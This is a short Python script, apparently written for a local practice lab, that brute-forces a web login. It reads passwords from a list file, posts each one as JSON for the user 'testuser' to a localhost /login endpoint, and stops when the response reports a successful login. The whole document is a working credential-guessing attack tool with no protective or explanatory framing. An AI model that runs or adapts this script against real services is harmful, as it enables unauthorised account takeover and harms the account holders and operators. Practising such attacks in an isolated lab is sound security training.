import requests
import json # Import the json library to work with JSON data

# --- Configuration ---
url = "http://127.0.0.1:5050/login"
username_to_test = "testuser"
password_list_file = "hack-env/passwordlist.txt" # Make sure this path is correct

# --- Brute-force logic ---
found_password = False
correct_password = None

try:
    with open(password_list_file, "r") as f:
        # Read all lines from the file into a list
        password_candidates = [line.strip() for line in f.readlines()]

    print(f"Attempting to find password for user '{username_to_test}'...")

    for password_candidate in password_candidates:
        payload = {
            "username": username_to_test,
            "password": password_candidate
        }

        try:
            # Send POST request
            response = requests.post(url, json=payload) # Use json=payload to automatically set Content-Type and encode

            # Check if the request was successful (status code 2xx)
            if response.status_code == 200:
                try:
                    response_data = response.json() # Parse the JSON response
                    if response_data.get("message") == "Login successful!":
                        correct_password = password_candidate
                        found_password = True
                        print(f"Success! Password found: {correct_password}")
                        break # Exit the loop once found
                except json.JSONDecodeError:
                    print(f"Received non-JSON response for password: {password_candidate}")
            elif response.status_code == 401:
                # Optionally, print for failed attempts if you want to see progress
                # print(f"Attempt failed for password: {password_candidate}")
                pass # Continue to the next password
            else:
                print(f"Unexpected status code {response.status_code} for password: {password_candidate}")

        except requests.exceptions.RequestException as e:
            print(f"Network error occurred: {e}")
            # You might want to break or retry here depending on requirements
            break

except FileNotFoundError:
    print(f"Error: Password list file not found at '{password_list_file}'")
except Exception as e:
    print(f"An unexpected error occurred: {e}")

if not found_password:
    print(f"Password for '{username_to_test}' not found in the provided list.")
